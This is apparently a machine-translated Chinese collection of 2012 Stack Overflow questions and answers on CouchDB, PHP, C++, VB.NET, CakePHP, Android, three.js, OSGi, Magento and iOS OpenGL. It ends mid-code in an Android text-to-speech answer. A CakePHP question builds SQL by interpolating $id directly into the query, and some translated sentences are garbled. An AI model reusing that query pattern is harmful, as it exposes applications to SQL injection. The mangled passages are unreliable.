作为农村电信研究项目的一部分，我实现了一个在 linux PC 上运行的多用户音频存储库。由于我熟悉 RDBMS，我已经在 MySQL 中实现了后端。在这个系统上并使用几乎无文本的 UI，注册用户可以创建并与其他注册用户共享录音，这些用户可以在下次登录系统时收听这些录音。该系统取得了成功，在过去的 8 个月中，用户一直在创建和收听许多录音。

我们研究项目的另一部分是在村里安装了一个 10 节点的无线网状网络。当一些用户步行 3 公里以上到达当前音频存储库时，我们现在正在研究如何创建在选定的网格节点站点上运行的分布式音频存储库。这样用户就可以走到一个运行分布式存储库的网状站点并创建、共享和收听录音。然后，新录音会在所有音频存储库节点之间同步。由于计算机和网状节点使用太阳能电池板，电源和连接通常是断断续续的，因此我们对实施集中式解决方案犹豫不决。因此，我们认为 couchdb 及其过滤复制将为我们的用例提供理想的解决方案。

由于我是 couchdb 的新手并且主要来自交互设计背景，我想知道如何最好地为这样的用例实现 couchdb 后端。每个用户的数据库是否合适，或者由于记录是在用户之间共享的，所以这不起作用？我是一个快速学习者，但希望获得一些关于如何设计数据库的建议，用户可以在其中注册自己（姓名、个人资料图片），然后创建私人录音，然后可以公开或与选定的用户共享？对于如何创建聚合特定用户创建的所有记录的视图，以及聚合其他用户与特定用户共享的所有记录的视图，我也将不胜感激。非常感谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T22:54:39.700

我会将所有内容都放在一个数据库（用户记录和用户配置文件）上，而不是为每个用户创建单独的数据库。有了它，您可以使用视图整理，例如发出用户配置文件和所有拥有的记录或所有共享记录与单个视图。

要创建录音，我只需添加带有指示谁是所有者的密钥对的录音文档。另一个密钥对可以是一个数组，其中包含已与之共享记录的所有配置文件的 ID。

对于用户界面，为了保持简单，您可以使用 Couchapp (http://couchapp.org/page/index)，但显然还有许多其他选项可以创建用户界面。

# php - PHP：图像裁剪器/调整器

> ID：13703505
> 
> 赞同：1
> 
> 时间：2012-12-04T12:58:48.483
> 
> 标签：php, jquery, image-processing, php-gd

我正在一个使用 JQuery 的 Masonry 插件有许多平铺图像的网站上工作。瓦片的大小都是统一的，但其中包含的图像可以是多种大小。

我想知道是否有一个很好的 PHP 插件/脚本推荐，它可以获取任何大小的传入图像，并执行任何需要以适应特定大小的框（自动调整大小、裁剪、插入黑色空间等）

编辑：

感谢您的 PHP 选项。JQuery领域也有什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:10:49.210

该脚本也适合您的需要：

[http://www.phpcodester.com/2011/01/php-function-to-resize-image-to-fit-in-a-standard-box-without-distortion/](http://www.phpcodester.com/2011/01/php-function-to-resize-image-to-fit-in-a-standard-box-without-distortion/)

如果你需要修改一些东西，php的图像函数总是命名为`imagesomething($resource,x,y,etc.)`

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:07:50.817

你应该看看 TimThumb： http: [//www.binarymoon.co.uk/projects/timthumb/](http://www.binarymoon.co.uk/projects/timthumb/)

# c++ - 数学题：三角形、金字塔、旋转、平移、缩放

> ID：13703507
> 
> 赞同：0
> 
> 时间：2012-12-04T12:58:53.647
> 
> 标签：c++, math, geometry, wolfram-mathematica, mathematical-optimization

另一个棘手的问题。你可以在这里看到的是我的物理金字塔，由 3 个 LED 构成，它们在 1 个平面中形成一个三角形，另一个 LED 在中间中心，比其他 3 个高约 18 毫米。第 4 个使三角形成为金字塔。（如果你看直角三角形可能会更好看。这个是围绕水平轴旋转的，你可以很好地看到一根棍子上的二极管）。

![示例三角形](../Images/fb6125b142195b049fa56e12e9e8c98a.png)

第二张图片显示了我正在运行的程序。左框显示了 LED 的原始图片（带红外滤光片的照片）。中间的图片显示我的程序找到了这些点，并且还能够根据某些条件判断哪个点是哪个点（例如 C 始终是二极管之间距离最大的两条线相交的位置；并且两条最长的长度总是a和b）。但不要在意这一点，我知道这些点是 100% 正确找到的。

然后右图是一些计算出来的值，比如C和c之间的高度等等。我可以计算更多，但我现在懒得关心，因为我被卡住了。

我想计算 3 维空间中的金字塔旋转和平移。

黄色点是在相机 z 方向上围绕通过三角形中心的轴旋转后的 LED。所以现在我不必担心这个，在计算其他 2 时。旋转围绕水平轴，旋转围绕垂直轴。我可以很容易地用从三角形中心到第 4 个二极管的距离长度（如您所见，第 4 个二极管在图像平面上旋转移动）或两个轴的长度来计算。

但我的问题是未知的深度。

它影响所有长度（a、b、c，以及从中心到第 4 个二极管的长度，如果我们称之为 d 和 e）。我知道真正金字塔的测量值，公差为 +-5% 左右，但它们也会受到缩放的影响。那么我该如何处理呢？

我想到了一个方程，它与水平轴的长度、垂直轴的长度、角度 alpha、beta 和 gamma 以及长度 d 和 e 之间的比率。

Alpha、beta 和 gamma 仅受围绕轴旋转的影响（我想知道。我想知道旋转和缩放），其中围绕一个轴的旋转与围绕另一个轴的旋转具有相反的效果。因此，如果您以相同的角度围绕两个轴旋转，则轴的长度之间的比率与以前相同。

变焦（真实：它离相机有多近；我想知道的第一名：乘法因子 2x、3x、0.5、0,4322344，.....）不会影响角度，但会影响所有长度：a，b，c，d，e，hc（轴的垂直长度），hx（我还没有计算过，但这很容易。hx这个名字可以变化，我现在只是想到了一些随机的东西；它是水平轴的长度）以同样的方式（我猜）。

你看我想了很多，但我觉得我太笨了。

那么，是否有任何数学天才可以给我正确的方程式，无论是旋转还是/和缩放因子？

（我也考虑过使用 Posit/Downhill-Simplex 等等，但这将是最好的，因为我已经知道很多了，就像所有的点一样，等等）

拜托，拜托，我需要你的帮助真的很糟糕！如果你需要知道的话，我正在用 C++ 和 OpenCV 的帮助下写这个，但我认为它更多的是一个数学问题。

提前致谢！

啊，而且 Alpha 似乎总是和 Beta 一样！

编辑：不得不删除第二张图片

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T17:19:19.003

看看OpenCV 中的[SolvePnP()](http://docs.opencv.org/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html?highlight=projection#solvepnp)。即使您不直接使用它，文档也会引用所使用的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:52:47.480

看看[Boost Geometry](http://www.boost.org/doc/libs/release/libs/geometry/)或[这里](https://www.ohloh.net/p/boost-geometry)

# c++ - 字符串类的迭代器

> ID：13703508
> 
> 赞同：-1
> 
> 时间：2012-12-04T12:58:54.113
> 
> 标签：c++, string, iterator

我正在创建一个字符串类（项目学校），我一直到最后为它创建迭代器，所以我的问题是我不知道从哪里开始我认为开始和结束但它们是如何实现的。这是到目前为止的代码：

```
class StringsTest {

public:
std::tr1::shared_ptr<char* > word; 
char* data;
int size;
int final;
int itSize;
StringsTest();
StringsTest(const StringsTest& orig);
virtual ~StringsTest();
StringsTest(char* strings);
StringsTest& swap( StringsTest& str2 );
int push_back(char a);
char pop_back();
int insert(int where, char what);
int erase(int where);
friend void operator<<(std::ostream& Ostr, const StringsTest& st);
friend std::istream& operator>>(std::istream& Istr, StringsTest& st);
char &operator[](int i);
int sizes();
int check();
stringIte& begin();
stringIte& end();

private:

protected:
};

#endif  /* STRINGPROJ_H *

//#endif    /* STRINGSTEST_H */

class stringIte {
public:
stringIte();
~stringIte(); 
```

和开始：

```
stringIte& StringsTest::begin() {
try {

} catch (std::exception e) {
    std::cout << " an error has ocurred " << e.what() << std::endl;
}
}

stringIte& StringsTest::end() {
try {

} catch (std::exception e) {

    std::cout << "nope " << e.what() << std::endl;

}
} 
```

我有这个类我如何实现迭代器开始（）。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:06:27.820

首先，您不想通过引用返回迭代器。按值返回它们。

迭代器就像指向集合元素的指针（在您的情况下指向字符串中的字符）。实现它们的一种方法是只`typedef char *stringIte;`使用原始指针作为迭代器（它们提供所有必要的功能）。`begin()`然后将返回`data`并`end()`返回`data + size`（假设`data`是指向字符串数据的指针，并且`size`是它的长度，没有终止`NUL`.

一种更奇特的方式可能是一个简单的结构，例如可以包含 a`StringTest*`和 an `int`，并在取消引用时从字符串中返回适当的字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:09:39.077

你已经有了`operator[]`。最简单的解决方案是让迭代器维护一个指向`StringTest` 对象的指针和一个索引，并让它`[]`在需要时使用字符串上的运算符。这还有一个额外的优势，因为它可以轻松检查错误。

如果迭代器知道字符串类的一些内部信息，则可能实现更有效的实现。例如，如果实际字符位于连续数组中，则迭代器可以由单个指针组成（甚至是指向 的 typedef `char*`）。

# vb.net - 根据多个字符拆分字符串

> ID：13703509
> 
> 赞同：1
> 
> 时间：2012-12-04T12:58:54.893
> 
> 标签：vb.net, .net-4.0

我正在尝试用多个字符分割一个字符串。字符串有时可能包含 a`-`或 a `/`。我所取得的是连字符，但我无法搜索斜线。关于如何同时基于两个字符拆分字符串的任何想法？一旦我`-`将. `-`_`result``'/'`

因此，例如`Split`字符串 has `Jet-blue`，下面的代码将`Jet`在`result`列表中添加 with`index(0)`和`blue`with `index(1)`。除了与拆分外，`'-'`我还想与拆分`'/'`。有什么建议么 ？

代码：

```
 Dim result As New List(Of String)()

    For Each str_get As String In Split

        Dim splitStr = str_get.Split("-") 

        For Each str_split As String In splitStr

            result.Add(str_split) ' Enter into result list

            ' result.TrimExcess()
        Next

        result.Remove("")

    Next 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:47:33.157

您可以使用[方法的](http://msdn.microsoft.com/en-us/library/system.string.split.aspx)[this](http://msdn.microsoft.com/en-us/library/b873y76a.aspx)或[this](http://msdn.microsoft.com/en-us/library/tabh47cf.aspx)重载。[`Split`](http://msdn.microsoft.com/en-us/library/system.string.split.aspx)

第一个需要一个数组`Char`：

```
"Hello World".Split({"e"c, "o"c}) ' Notice the c! 
```

`String`第二个采用and数组[`StringSplitOptions`](http://msdn.microsoft.com/en-us/library/system.stringsplitoptions.aspx)：

```
"Hello World".Split({"el", "o"}, StringSplitOptions.None) 
```

# php - 将左连接表行作为嵌套数组的 Cakephp 自定义查询

> ID：13703513
> 
> 赞同：1
> 
> 时间：2012-12-04T12:59:04.430
> 
> 标签：php, mysql, cakephp

我正在尝试为下面的 Cakephp 自定义查询获取嵌套数组：

```
$this->query("
                SELECT *
                FROM group_buys GroupBuy
                LEFT JOIN products Product
                ON Product.id = GroupBuy.product_id
                LEFT JOIN group_buy_users GroupBuysUser
                ON GroupBuysUser.group_buy_id = GroupBuy.id
                LEFT JOIN group_buy_images GroupBuyImage
                ON GroupBuyImage.group_buy_id = GroupBuy.id
                LEFT JOIN product_details ProductDetail
                ON ProductDetail.product_id = Product.id
                LEFT JOIN specifications Specification
                ON Specification.id = ProductDetail.specification_id
                LEFT JOIN specification_categories SpecificationCategory
                ON SpecificationCategory.id = Specification.specification_category_id
                WHERE GroupBuy.id = {$id}
            "); 
```

问题在于它显然会产生冗余数据，而 GroupBuy 表行值重复我不想要。

如果 LEFT JOINED 表的行数比使用 Cake 的自定义查询的前表多，我们是否可以使用嵌套数组？

我知道这可以通过 find recursive = 2 来完成，但希望通过自定义查询来实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:20:50.347

您是否尝试过使用可包含的？

```
$this->GroupBuy->Behaviors->attach('Containable');

$this->GroupBuy->find('all', array(
    'conditions' => array('GroupBuy.id' => $id),
    'contain' => array(
        'Product' => array(
            'ProductDetail' => array(
                'Specification' => array(
                    'SpecificationCategory'
                )
            )
        ),
        'GroupBuysUser',
        'GroupBuyImage'
    ),
)); 
```

# android - Android MediaPlayer.getCurrentPosition 不规则增加规则间隔

> ID：13703522
> 
> 赞同：3
> 
> 时间：2012-12-04T12:59:50.807
> 
> 标签：android, media-player

我对 MediaPlayer.getCurrentPosition 函数感到非常不满。我有自己的圆形图形控制面板（360° == 100%）。每个时间间隔我都使用 getCurrentPosition 进行当前状态计数。在 samsugn g3 上无法使用

假设我每 50 毫秒取一次值。我大约有一些周期性地得到值：

0,50,100,150,200,200,200,200,250,300,350,400,450,450,450,......

我曾经在 200 毫秒内获得 4 倍值 200，然后一切正常，然后在 200 毫秒内再次获得 5 倍相同的值。由于这种行为，我当前状态的图形可视化会定期停止一小会儿。尽管播放器播放记录罚款。

我尝试使用 progres StopWatch 并以固定值周期性增加，但它比 mediaPlayer currentPosition 快。比我试图增加它更复杂：

```
 int realPlayerPos = mediaPlayer.GetCurrentPosition();
        if (realPlayerPos > recCurPos)
        {
            ratio += 1; 
            recCurPos = (int) (recCurPos +timeTact + ratio);                
        }
        else
        {
            ratio -= 1;
            recCurPos = (int) (recCurPos +timeTact + ratio);                    
        } 
```

但可以看出，它有时流动得更快，有时更慢。请我不知道如何为我的图形组件获得可靠的价值。

# javascript - javascript将字符串中的双引号转换为单引号

> ID：13703523
> 
> 赞同：0
> 
> 时间：2012-12-04T12:59:50.607
> 
> 标签：javascript, jquery, regex

我有一个包含单引号和双引号的字符串。[你可以在这里看到](http://jsfiddle.net/UdNBu/2/)。首先，如果我尝试创建该字符串的 jquery 对象，我会破坏 href 和它的页面链接。这两个部分的行为类似于标签的属性，并在页面的链接部分附加了一个额外的双引号。像 $(mystr)= ... href="" display.aspx""" 的控制台，其中 display.aspx 是页面的链接。但是如果我尝试 href=\'display.aspx\'，我就能得到预期输出。我如何摆脱这个属性分区问题？jsfiddle上给出的代码是

```
var s= "<tr role=\"row\" id=\"1\" tabindex=\"-1\" class=\"ui-widget-content jqgrow ui-row-ltr\"><td role=\"gridcell\" style=\"\" title=\"Albania\" aria-describedby=\"mytabl_Country\">Albania</td><td role=\"gridcell\" style=\"text-align:center;\" title=\"\" aria-describedby=\"mytabl_Nutrition related\"><img class=\"resultsGridImage\" src=\"Images/check.png\" oldtitle=\"Click on reference ID to view details:<ol><li>ID: <a target=\'_blank\' href=\"DisplayRefmat.aspx?NOPAID=241\">241</a>, Analyses of the situation and national action plan on food and nutrition for Albania 2003-2008</li> <li>ID: <a target=\'_blank\' href=\"DisplayRefmat.aspx?NOPAID=826\">826</a>, Towards a healthy country with healthy people - Public health and health promotion strategy</li> <li>ID: <a target=\'_blank\' href=\"DisplayRefmat.aspx?NOPAID=827\">827</a>, Analyses of the State of Food and Nutrition in Albania</li> <li>ID: <a target=\'_blank\' href=\"DisplayRefmat.aspx?NOPAID=828\">828</a>, Recommendation on healthy nutrition in Albania</li> </ol>\"></td></tr>";
console.debug($(s));
$('#btable').append(s); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:19:56.090

也许我想在这里简单化，但是当我查看上面的代码时会想到这一点：

```
var s= "<tr role=\"row\" id=\"1\"....</tr>"; 
```

可以写成

```
var s= "<tr role='row' id='1'...</tr>"; 
```

为什么在你的字符串中使用双引号？

# three.js - ThreeJS：将 BufferGeometry 与 Line 一起使用

> ID：13703530
> 
> 赞同：1
> 
> 时间：2012-12-04T13:00:08.133
> 
> 标签：three.js, webgl, buffer-geometry

出于性能原因，我想迁移到`BufferGeometry`而不是`Geometry`. 它适用于`Mesh`和`ParticleSystem`对象，但是当将 a 的几何设置`Line`为 a 时`BufferGeometry`，`initLineBuffer()`需要`geometry.vertices`一个 BufferGeometry 没有的 Vector3 数组。

调用栈：render --> initWebGLObjects --> addObject --> initLineBuffers

有没有一个简单的解决方案，或者我需要破解？;)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-17T03:02:15.477

BufferGeometry 现在确实支持线条。查看 webgl_buffergeometry_lines.html 示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T17:18:32.667

看起来现在 BufferGeometry 只会画出三角形，所以你不能让它画线（除非你做一些事情，比如让三个三角形顶点中的两个相同，但这很hacky）。它支持网格和粒子，所以也许很快它就会支持线条。[这是源代码中的行](https://github.com/mrdoob/three.js/blob/master/src/renderers/WebGLRenderer.js#L3355)

# spring - 结合 OSGi 蓝图和 spring 配置

> ID：13703541
> 
> 赞同：11
> 
> 时间：2012-12-04T13:00:36.360
> 
> 标签：spring, osgi, spring-dm, blueprint-osgi

关于 Spring 配置和 OSGi 蓝图（例如 Gemini 蓝图）的组合是否有任何好的/最佳实践？您使用哪些 XML 文件？您将它们放在您的 OSGi 包中的什么位置（`META-INF/spring`, `OSGi-INF`）？这些实践中的哪一个允许您将捆绑包与蓝图的非双子座实现结合使用？

背景：我们正在从 Spring/Spring DM 切换到 Spring/Blueprint。我知道蓝图定义了一个`<bean>`元素。然而，我们偶尔会遇到蓝图规范有限的 bean 定义能力并不能满足我们所有需求的情况。因此，在我们的包中使用 Spring 配置和通过 OSGi 服务连接包的蓝图似乎是一个不错的选择。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-07-04T09:35:11.197

> 您使用哪些 XML 文件？你把它们放在你的 OSGi 包（META-INF/spring，OSGi-INF）的什么地方？这些实践中的哪一个允许您将捆绑包与蓝图的非双子座实现结合使用？

Gemini Blueprint 同等对待这两个目录，但**`OSGI-INF/blueprint/*.xml`它是通用 OSGi Blueprint 规范中唯一指定的目录。**

[Gemini Blueprint 文档](http://www.eclipse.org/gemini/blueprint/documentation/reference/1.0.2.RELEASE/html/app-deploy.html#app-deploy%3aheaders)中的建议做法是：

> [...] 建议的做法是将应用程序上下文配置拆分为至少两个文件，分别以约定 modulename-context.xml 和 modulename-osgi-context.xml 命名。modulename-context.xml 文件包含独立于任何 OSGi 知识的常规 bean 定义。modulename-osgi-context.xml 文件包含用于导入和导出 OSGi 服务的 bean 定义。它可以（但不是必须）使用 Gemini Blueprint OSGi 模式作为顶级命名空间，而不是 Spring 'beans' 命名空间。

我试过这个，效果很好。我将 Gemini Blueprint 用于我的一个项目，其中包含文件`META-INF/spring/context.xml`，它定义了我的 bean 及其关系，以及`META-INF/spring/osgi-context.xml`定义了哪些 bean 从 OSGi 服务公开/导入以及如何公开。`context.xml`好像

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd">
    <bean id="myOrdinarySpringBean" class="com.acme.impl.Foo"/>
</beans> 
```

并且是一个普通的普通 Spring 应用程序上下文，根本没有 Blueprint/OSGi 配置。`osgi-context.xml`好像

```
<blueprint xmlns="http://www.osgi.org/xmlns/blueprint/v1.0.0">
    <service id="myOsgiService" ref="myOrdinarySpringBean" interface="com.acme.Foo"/>
</blueprint> 
```

当然，您也可以`<beans>`在这里使用命名空间和根元素，但是您必须`xmlns:osgi`像这样定义 a 并为服务添加前缀：`<osgi:service .../>`这样才能工作。就我而言，我不需要 Gemini 特定蓝图的东西，所以我对这个通用蓝图配置很满意。同样，我也可以使用`<blueprint>`命名空间`context.xml`，但是这个特定的应用程序是一个旧应用程序，正在移植到 OSGi，所以我现在更愿意保留 Spring 特定的配置。

另一个应用程序反过来有自己的`osgi-context.xml`喜欢

```
<blueprint xmlns="http://www.osgi.org/xmlns/blueprint/v1.0.0">
  <reference id="myOrdinarySpringBeanImportedFromOsgi" interface="com.acme.Foo" availability="mandatory"/>
</blueprint> 
```

而此时没有，但可以，有自己的`context.xml`喜欢

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd">
    <bean id="myOrdinaryOtherSpringBean" class="com.acme.impl.Bar">
        <property name="foo" ref="myOrdinarySpringBeanImportedFromOsgi"/>
    </bean>
</beans> 
```

并且真的不在乎`myOrdinarySpringBeanImportedFromOsgi`是从 OSGi 服务导入还是定义为同一应用程序上下文中的常规普通 Spring bean。

如果我想将自己与 Gemini 蓝图实现分离，这些`META-INF/osgi-context.xml`配置可以很容易地移到，但目前我更喜欢将这两部分放在同一个地方，以避免弄乱目录结构。`OSGI-INF/blueprint/`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-21T18:25:41.173

蓝图文件应位于 OSGI-INF/blueprint/ 下并命名为 *.xml（通常为 blueprint.xml）。此位置符合 OSGi 4.2 蓝图规范，适用于 Aries 或 Gemini。

Spring-DM 文件（你可能知道）在 META-INF/spring/ 下，也被命名为 *.xml（通常是 beans.xml）

这两个文件应该能够和平共存。但是，只有在您支持安装的每个容器时，它们才会起作用。

接线应通过 OSGi 服务注册表完成。

至于迁移，我们一直使用 Spring-DM 以获得我们在 Blueprint 中无法实现的功能。其他所有内容都已迁移到 Blueprint。

# php - 如何使用 magento api 创建图像

> ID：13703544
> 
> 赞同：3
> 
> 时间：2012-12-04T13:00:36.723
> 
> 标签：php, api, magento, soap

我正在尝试使用 magento api 创建图像，但消息失败

```
SoapFault exception: [104] Cannot create image. 
```

这不是一个有用的错误消息！这是什么意思？为什么要这样做？如何使用 magento api 创建图像？

这是我的代码：

```
$client = new SoapClient($wsdlurl);
$sessionId = $client->login($user, $key);
$file = array(
    'content' =>
    base64_encode(file_get_contents($filename)),
    'mime' => 'image/jpeg',
    'name' => 'newfile.jpg'
);

$result = $client->call(
    $sessionId,
    'catalog_product_attribute_media.create',
    array(
        $productId,
        array('file'=>$file, 'label'=>'new_test_label', 'position'=>'100', 'types'=>array('thumbnail'), 'exclude'=>0)
    )
); 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:39:35.487

我找到了解决方案。它试图将图像放入的目录 (.../media/catalog/product/) 没有设置允许在其中创建新文件夹的权限。

不过，为了其他人的利益，我确实发现了一些有用的东西：首先，文件系统操作由 ./lib/Varien/Io/File.php 执行，它有自己的 cd、mkdir 等包装器，其中如果失败，抛出非常模糊的异常。

目录创建发生在 Mage_Catalog_Model_Product_Attribute_Backend_Media->_moveImageFromTmp

它是从 ./app/code/core/Mage/Catalog/Model/Product/Attribute/Media/Api.php 调用的，它处理所有图像 api 调用，例如创建、更新、删除等。

因此，如果您有同样的问题并且不是权限问题……您现在知道将调试代码放在哪里；）。

哦，是的，如果你想输出一条错误信息，你不能只是回显或死亡；您需要抛出一个异常，该异常将被 Mage_Catalog_Model_Product_Attribute_Media_Api 捕获，然后调用 $this->_fault 将其发送给客户端。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-16T23:28:31.647

我只是想为此添加一些其他相关信息 - 感谢 Benubird 的评论，它们非常有帮助。我试图通过 API 上传图像并收到“无法创建图像”消息。

在深入研究 Magento 之后，我发现如果您的 php.ini 文件中的内存限制为 -1，那么这会阻止任何图像被上传。在 Magento 核心中，在尝试处理图像之前会进行检查（lib/Varien/Image/Adapter/Gd2.php 第 57 行），其中将图像的大小与可用内存进行比较。它不考虑值 -1 表示无限制，并引发“已达到内存限制”异常。

解决此问题的方法是将 memory_limit 值设置为非负数。对此的正确解决方法是让 Magento 代码正确处理此问题（尽管如果 imagecreatefromjpeg 因不可捕获的错误而死，那么它可能是不可能的）。

祝你好运！

# ios - ios4.2 opengl 不能工作

> ID：13703547
> 
> 赞同：-4
> 
> 时间：2012-12-04T13:00:43.553
> 
> 标签：ios, opengl-es, yuv

我已经获得了 h.264 数据并将它们解码为 YUV 缓冲区，并且我在 ios5 和 ios6 上通过 opengl 显示了 yup 数据，但是当我尝试在我的 iPad（ios4.2.1）上运行它时，它当前无法显示，只是所有的屏幕绿色。我不知道为什么，这是我的代码：

```
-(void)playVideoData:(void *)data
{

if (!_textureY)
{
    glGenTextures(1, &_textureY);
    glGenTextures(1, &_textureU);
    glGenTextures(1, &_textureV);
}

glActiveTexture(GL_TEXTURE0);
glBindTexture(GL_TEXTURE_2D, _textureY);
glTexImage2D(GL_TEXTURE_2D, 0, GL_RED_EXT, _videoW, _videoH, 0, GL_RED_EXT, GL_UNSIGNED_BYTE, y);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);

glActiveTexture(GL_TEXTURE1);
glBindTexture(GL_TEXTURE_2D, _textureU);
glTexImage2D(GL_TEXTURE_2D, 0, GL_RED_EXT, _videoW/2, _videoH/2, 0, GL_RED_EXT, GL_UNSIGNED_BYTE, u);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);

glActiveTexture(GL_TEXTURE2);
glBindTexture(GL_TEXTURE_2D, _textureV);
glTexImage2D(GL_TEXTURE_2D, 0, GL_RED_EXT, _videoW/2, _videoH/2, 0, GL_RED_EXT, GL_UNSIGNED_BYTE, v);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);

[self render]; 
```

}
- （无效）渲染{

```
glViewport(viewportx,viewporty, VIEWWIDTH, VIEWHEIGHT);
glClearColor(0.0, 0, 0.0, 0);
glClear(GL_COLOR_BUFFER_BIT);

glUseProgram(programId);

// Update uniform value
//glUniform1f(uniforms[UNIFORM_TRANSLATE], 0.0f);
GLuint textureUniformY = glGetUniformLocation(programId, "SamplerY");
GLuint textureUniformU = glGetUniformLocation(programId, "SamplerU");
GLuint textureUniformV = glGetUniformLocation(programId, "SamplerV");

// Update attribute values
glVertexAttribPointer(ARDRONE_ATTRIB_POSITION, 2, GL_FLOAT, 0, 0, squareVertices);
glEnableVertexAttribArray(ARDRONE_ATTRIB_POSITION);

glVertexAttribPointer(ARDRONE_ATTRIB_TEXCOORD, 2, GL_FLOAT, 0, 0, coordVertices);
glEnableVertexAttribArray(ARDRONE_ATTRIB_TEXCOORD);

glActiveTexture(GL_TEXTURE0);
glBindTexture(GL_TEXTURE_2D, _textureY);
glUniform1i(textureUniformY, 0);

glActiveTexture(GL_TEXTURE1);
glBindTexture(GL_TEXTURE_2D, _textureU);
glUniform1i(textureUniformU, 1);

glActiveTexture(GL_TEXTURE2);
glBindTexture(GL_TEXTURE_2D, _textureV);
glUniform1i(textureUniformV, 2); 
```

} -(void)drawFrame2
{

```
if (context != nil)
{
    //make it the current context for rendering
    [EAGLContext setCurrentContext:context];

    //if our framebuffers have not been created yet, do that now!
    if (!defaultFramebuffer)
        [self createFramebuffer];

    glBindFramebuffer(GL_FRAMEBUFFER, defaultFramebuffer);

    [self playVideoData];
    glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);
    glBindRenderbuffer(GL_RENDERBUFFER, colorRenderbuffer);

    [context presentRenderbuffer:GL_RENDERBUFFER];
}
else
    NSLog(@"Context not set!"); 
```

}

我已将数据放入 yuv 缓冲区，这里是我的 fsh 和 vsh：

```
 vsh:    

    attribute vec4 position; // 1

    //uniform float translate;

    attribute vec2 TexCoordIn; // New

    varying vec2 TexCoordOut; // New

    void main(void)

    {
    gl_Position = position; // 6

    TexCoordOut = TexCoordIn;

    }

    fsh:

    varying lowp vec2 TexCoordOut;

    uniform sampler2D SamplerY;

    uniform sampler2D SamplerU;

    uniform sampler2D SamplerV;

    void main(void)
   {

   mediump vec3 yuv;

   lowp vec3 rgb;

   yuv.x = texture2D(SamplerY, TexCoordOut).r;

   yuv.y = texture2D(SamplerU, TexCoordOut).r - 0.5;

   yuv.z = texture2D(SamplerV, TexCoordOut).r - 0.5;    

   rgb = mat3( 1,       1,         1,
           0,       -0.39465,  2.03211,
           1.13983, -0.58060,  0) * yuv;

   gl_FragColor = vec4(rgb, 1);

   } 
```

iOs4.2 没有错误，shaders 编译正常，但是就是不能显示...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-09T16:59:36.637

这是因为`GL_RED_EXT`您用于上传纹理的扩展仅在 iOS 5.0 中添加，而在 iOS 4.2 中不存在。您将无法使用它以这种方式上传 YUV 纹理，因此您需要重写代码的那部分。另外，我相信这个扩展只支持 iPad 2 和更新的设备，而不是原始的 iPad 和旧的 iPhone，所以你甚至不能在 iOS 5+ 上为旧的设备使用它。

# android - android向用户发送语音通知

> ID：13703551
> 
> 赞同：2
> 
> 时间：2012-12-04T13:01:03.023
> 
> 标签：android, notifications

我写了一个后台服务来查找用户的位置。现在我想在用户位置发生变化时向用户发送语音通知。我已经编写了用于确定位置更改和发送简单推送通知的代码，现在任何人都可以帮助我制作语音通知或如何编写语音通知代码，或者是否有任何第三方库可以通过它向用户发送语音通知. 帮助表示赞赏。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-05T06:41:25.173

是的，最后我以非常简单的方式和完整的解决方案得到了它。

```
private TextToSpeech myTTS;   // Define the TTS objecy
private int MY_DATA_CHECK_CODE = 0;

//write the following code in oncreate method or whereever you want to use this
{ 
    myTTS = new TextToSpeech(this, this);

    Intent checkTTSIntent = new Intent();
    checkTTSIntent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
    startActivityForResult(checkTTSIntent, MY_DATA_CHECK_CODE);
    speakWords("Pass the String here"); 
}

private void speakWords(String speech) {
    //speak straight away
    //myTTS.setLanguage(Locale.US);
    System.out.println(speech + " TTSTTTS");
